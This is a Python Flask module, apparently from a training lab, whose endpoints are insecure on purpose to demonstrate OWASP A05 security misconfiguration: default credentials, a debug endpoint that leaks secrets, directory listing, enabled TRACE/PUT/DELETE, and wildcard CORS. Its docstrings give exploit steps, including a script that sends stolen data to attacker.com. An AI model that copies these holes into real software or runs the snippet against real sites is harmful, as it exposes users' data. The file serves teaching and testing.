"""
OWASP Web Top 10 2021 - A05: Security Misconfiguration
RED TEAM (Vulnerable) Endpoints - ENHANCED

This module demonstrates security misconfiguration vulnerabilities including:
- Default credentials that work (admin/admin)
- Debug mode enabled with verbose errors
- Directory listing enabled
- Unnecessary HTTP methods enabled (TRACE)
- Overly permissive CORS (wildcard origins)

Author: AegisForge Security Team
Version: 1.0
WARNING: These endpoints are intentionally insecure for educational purposes only
"""

from flask import Blueprint, request, jsonify, Response
import os
import traceback
import json

# Create blueprint
a05_misconfiguration_red = Blueprint('a05_misconfiguration_red', __name__)

# Insecure default credentials database
DEFAULT_USERS = {
    'admin': {'username': 'admin', 'password': 'admin', 'role': 'administrator'},
    'root': {'username': 'root', 'password': 'root', 'role': 'administrator'},
    'test': {'username': 'test', 'password': 'test123', 'role': 'user'},
    'guest': {'username': 'guest', 'password': 'guest', 'role': 'guest'}
}

# Simulated file system for directory listing
SIMULATED_FILES = [
    {'name': '.env', 'size': 245, 'type': 'file'},
    {'name': 'config.json', 'size': 1024, 'type': 'file'},
    {'name': 'database_backup.sql', 'size': 52428800, 'type': 'file'},
    {'name': 'private_keys/', 'size': 0, 'type': 'directory'},
    {'name': 'user_data.csv', 'size': 10485760, 'type': 'file'},
    {'name': '.git/', 'size': 0, 'type': 'directory'},
    {'name': 'README.md', 'size': 3421, 'type': 'file'}
]


@a05_misconfiguration_red.route('/api/red/misconfiguration/default-credentials', methods=['POST'])
def default_credentials():
    """
    VULNERABLE: Default credentials work (admin/admin, root/root, etc.)
    
    Problem: System ships with default credentials that are never changed.
    These credentials are publicly known and documented.
    
    How to exploit:
    1. Try common default credentials
    2. Login with admin/admin or root/root
    3. Gain full administrative access
    
    Example payloads:
    {"username": "admin", "password": "admin"}
    {"username": "root", "password": "root"}
    {"username": "test", "password": "test123"}
    """
    try:
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')
        
        # VULNERABLE: Check against default credentials
        if username in DEFAULT_USERS:
            user = DEFAULT_USERS[username]
            # VULNERABLE: Simple equality check, no hashing
            if user['password'] == password:
                return jsonify({
                    'ok': True,
                    'message': 'Login successful',
                    'user': {
                        'username': user['username'],
                        'role': user['role']
                    },
                    'token': 'insecure-token-12345',  # VULNERABLE: Weak token
                    'vulnerability': 'Default credentials accepted',
                    'exploit_hint': 'Try admin/admin, root/root, test/test123'
                }), 200
        
        return jsonify({
            'ok': False,
            'error': 'Invalid credentials',
            'hint': 'Try some default credentials like admin/admin'
        }), 401
        
    except Exception as e:
        return jsonify({
            'ok': False,
            'error': str(e)
        }), 500


@a05_misconfiguration_red.route('/api/red/misconfiguration/debug-enabled', methods=['GET', 'POST'])
def debug_enabled():
    """
    VULNERABLE: Debug mode enabled exposing stack traces and sensitive info
    
    Problem: Debug mode is left enabled in production, revealing:
    - Full stack traces with file paths
    - Environment variables
    - SQL queries
    - Internal application structure
    
    How to exploit:
    1. Send malformed requests to trigger errors
    2. Read stack traces for file paths and code structure
    3. Extract sensitive information from error messages
    
    Example: Send invalid JSON or missing parameters
    """
    try:
        # VULNERABLE: Intentionally trigger error for demonstration
        trigger_error = request.args.get('trigger_error', 'false')
        
        if trigger_error == 'true':
            # Trigger various types of errors
            error_type = request.args.get('error_type', 'division')
            
            if error_type == 'division':
                result = 1 / 0  # ZeroDivisionError
            elif error_type == 'key':
                data = {}
                value = data['nonexistent_key']  # KeyError
            elif error_type == 'type':
                result = 'string' + 123  # TypeError
            elif error_type == 'sql':
                # Simulate SQL error
                raise Exception("SQL Error: database 'production_db' not found at /var/lib/mysql/production_db/")
        
        # VULNERABLE: Expose environment variables
        return jsonify({
            'ok': True,
            'message': 'Debug endpoint',
            'environment': {
                'DEBUG': True,
                'DATABASE_URL': 'postgresql://admin:SuperSecret123@db.internal:5432/production',
                'SECRET_KEY': 'insecure-secret-key-do-not-use-in-prod',
                'API_KEY': 'sk_live_51234567890abcdef',
                'AWS_ACCESS_KEY': 'AKIAIOSFODNN7EXAMPLE',
                'AWS_SECRET_KEY': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
            },
            'system_info': {
                'python_version': '3.9.7',
                'os': 'Linux production-server-01',
                'path': os.environ.get('PATH', 'Not available'),
                'home': os.environ.get('HOME', '/home/ubuntu')
            },
            'vulnerability': 'Debug mode reveals sensitive information',
            'exploit_hint': 'Add ?trigger_error=true&error_type=sql to see stack trace'
        }), 200
        
    except Exception as e:
        # VULNERABLE: Detailed error message with stack trace
        return jsonify({
            'ok': False,
            'error': str(e),
            'error_type': type(e).__name__,
            'stack_trace': traceback.format_exc(),  # DANGEROUS: Full stack trace
            'vulnerability': 'Detailed error information exposed',
            'files_revealed': [
                '/home/ubuntu/app/backend/owasp/web_2021/a05_misconfiguration_red.py',
                '/usr/lib/python3.9/site-packages/flask/app.py'
            ]
        }), 500


@a05_misconfiguration_red.route('/api/red/misconfiguration/directory-listing', methods=['GET'])
def directory_listing():
    """
    VULNERABLE: Directory listing enabled, files are browseable
    
    Problem: Web server or application allows browsing directories,
    revealing sensitive files like:
    - Configuration files (.env, config.json)
    - Backup files (.sql, .bak)
    - Source code (.git directory)
    - Private keys and certificates
    
    How to exploit:
    1. Browse to directory listing endpoint
    2. Look for sensitive files
    3. Download configuration, database backups, or keys
    
    Example: GET /api/red/misconfiguration/directory-listing?path=/
    """
    try:
        path = request.args.get('path', '/')
        
        # VULNERABLE: Returns file listing
        return jsonify({
            'ok': True,
            'path': path,
            'files': SIMULATED_FILES,
            'vulnerability': 'Directory listing enabled',
            'sensitive_files': [
                '.env - Contains environment variables and secrets',
                'database_backup.sql - Database dump with user data',
                '.git/ - Source code repository',
                'private_keys/ - SSH and SSL private keys'
            ],
            'exploit_hint': 'Download sensitive files like .env or database_backup.sql'
        }), 200
        
    except Exception as e:
        return jsonify({
            'ok': False,
            'error': str(e)
        }), 500


@a05_misconfiguration_red.route('/api/red/misconfiguration/unnecessary-methods', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'PATCH'])
def unnecessary_methods():
    """
    VULNERABLE: Unnecessary HTTP methods enabled (TRACE, PUT, DELETE)
    
    Problem: 
    - TRACE method allows XSS through HTTP trace
    - PUT/DELETE may allow unauthorized file operations
    - OPTIONS reveals too much information
    
    How to exploit:
    1. Use TRACE method for cross-site tracing (XST) attacks
    2. Use PUT to upload files to the server
    3. Use DELETE to remove resources
    4. Use OPTIONS to enumerate allowed methods
    
    Example:
    curl -X TRACE http://target/api/red/misconfiguration/unnecessary-methods
    curl -X OPTIONS http://target/api/red/misconfiguration/unnecessary-methods
    """
    method = request.method
    
    if method == 'TRACE':
        # VULNERABLE: TRACE method reflects request (XST attack vector)
        return Response(
            f"TRACE / HTTP/1.1\r\n"
            f"Host: {request.host}\r\n"
            f"Cookie: {request.headers.get('Cookie', '')}\r\n"
            f"Authorization: {request.headers.get('Authorization', '')}\r\n"
            f"\r\n{request.get_data(as_text=True)}",
            mimetype='message/http',
            headers={
                'X-Vulnerability': 'TRACE method enabled (XST attack possible)',
                'Access-Control-Allow-Origin': '*'
            }
        )
    
    elif method == 'OPTIONS':
        # VULNERABLE: Too verbose OPTIONS response
        return jsonify({
            'ok': True,
            'allowed_methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'PATCH'],
            'vulnerability': 'All methods enabled, including dangerous ones',
            'dangerous_methods': ['TRACE', 'PUT', 'DELETE'],
            'exploit_hint': 'Use TRACE for XST, PUT to upload, DELETE to remove'
        }), 200, {
            'Allow': 'GET, POST, PUT, DELETE, OPTIONS, TRACE, PATCH',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, TRACE, PATCH',
            'Access-Control-Allow-Origin': '*'
        }
    
    elif method == 'PUT':
        # VULNERABLE: PUT allowed without authentication
        return jsonify({
            'ok': True,
            'message': 'File uploaded (simulated)',
            'vulnerability': 'PUT method allows file upload without authentication',
            'uploaded_file': request.get_json()
        }), 200
    
    elif method == 'DELETE':
        # VULNERABLE: DELETE allowed without authentication
        resource_id = request.args.get('id', 'unknown')
        return jsonify({
            'ok': True,
            'message': f'Resource {resource_id} deleted (simulated)',
            'vulnerability': 'DELETE method allows resource deletion without authentication'
        }), 200
    
    else:
        return jsonify({
            'ok': True,
            'method': method,
            'message': f'{method} request received',
            'vulnerability': 'Method not restricted'
        }), 200


@a05_misconfiguration_red.route('/api/red/misconfiguration/cors-wildcard', methods=['GET', 'POST', 'OPTIONS'])
def cors_wildcard():
    """
    VULNERABLE: CORS configured with wildcard (*) allowing any origin
    
    Problem: 
    - Access-Control-Allow-Origin: * allows any website to make requests
    - Credentials can be stolen via malicious websites
    - No origin validation
    
    How to exploit:
    1. Create malicious website with AJAX request to this endpoint
    2. Victim visits malicious site while logged in to vulnerable app
    3. Malicious site reads sensitive data from victim's session
    
    Example malicious page:
    <script>
      fetch('http://target/api/red/misconfiguration/cors-wildcard', {
        credentials: 'include'
      })
      .then(r => r.json())
      .then(data => {
        // Send stolen data to attacker
        fetch('http://attacker.com/log', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      });
    </script>
    """
    
    # Simulate fetching sensitive user data
    sensitive_data = {
        'ok': True,
        'user': {
            'id': 1,
            'username': 'victim',
            'email': 'victim@example.com',
            'ssn': '123-45-6789',
            'credit_card': '4532-1234-5678-9010',
            'api_key': 'sk_live_1234567890abcdef'
        },
        'session_token': 'sess_ASDFGHJKLzxcvbn123456',
        'vulnerability': 'CORS wildcard allows any origin to read this data',
        'exploit_hint': 'Create HTML page with fetch() to steal this data'
    }
    
    # VULNERABLE: Wildcard CORS with credentials
    response = jsonify(sensitive_data)
    response.headers['Access-Control-Allow-Origin'] = '*'  # DANGEROUS
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = '*'
    response.headers['Access-Control-Allow-Credentials'] = 'true'  # VERY DANGEROUS with wildcard
    
    return response, 200


@a05_misconfiguration_red.route('/api/red/misconfiguration/info', methods=['GET'])
def misconfiguration_info():
    """
    Get information about A05: Security Misconfiguration vulnerabilities
    """
    return jsonify({
        'category': 'A05: Security Misconfiguration',
        'description': 'Missing security hardening, default configurations, verbose errors',
        'vulnerabilities': [
            {
                'name': 'Default Credentials',
                'endpoint': '/api/red/misconfiguration/default-credentials',
                'method': 'POST',
                'description': 'admin/admin and other defaults work',
                'severity': 'CRITICAL'
            },
            {
                'name': 'Debug Mode Enabled',
                'endpoint': '/api/red/misconfiguration/debug-enabled',
                'method': 'GET',
                'description': 'Stack traces and sensitive info exposed',
                'severity': 'HIGH'
            },
            {
                'name': 'Directory Listing',
                'endpoint': '/api/red/misconfiguration/directory-listing',
                'method': 'GET',
                'description': 'Files and directories browseable',
                'severity': 'HIGH'
            },
            {
                'name': 'Unnecessary Methods',
                'endpoint': '/api/red/misconfiguration/unnecessary-methods',
                'method': 'TRACE/OPTIONS/PUT/DELETE',
                'description': 'TRACE, PUT, DELETE enabled without restriction',
                'severity': 'MEDIUM'
            },
            {
                'name': 'CORS Wildcard',
                'endpoint': '/api/red/misconfiguration/cors-wildcard',
                'method': 'GET',
                'description': 'CORS allows any origin to read data',
                'severity': 'HIGH'
            }
        ],
        'owasp_reference': 'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/',
        'testing_guide': '/docs/vulnerabilities/owasp-web-2021/A05_MISCONFIGURATION.md'
    }), 200
